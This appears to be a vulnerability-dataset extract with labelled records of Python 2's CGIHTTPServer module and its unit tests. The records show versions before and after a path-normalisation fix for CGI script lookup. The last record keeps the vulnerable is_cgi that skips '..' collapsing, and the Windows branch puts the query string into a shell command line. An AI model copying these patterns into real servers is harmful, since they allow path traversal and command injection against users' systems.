                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
10,c5abced949e6a4b001d1dee321593e74ecadecfe,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
11,c5abced949e6a4b001d1dee321593e74ecadecfe,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
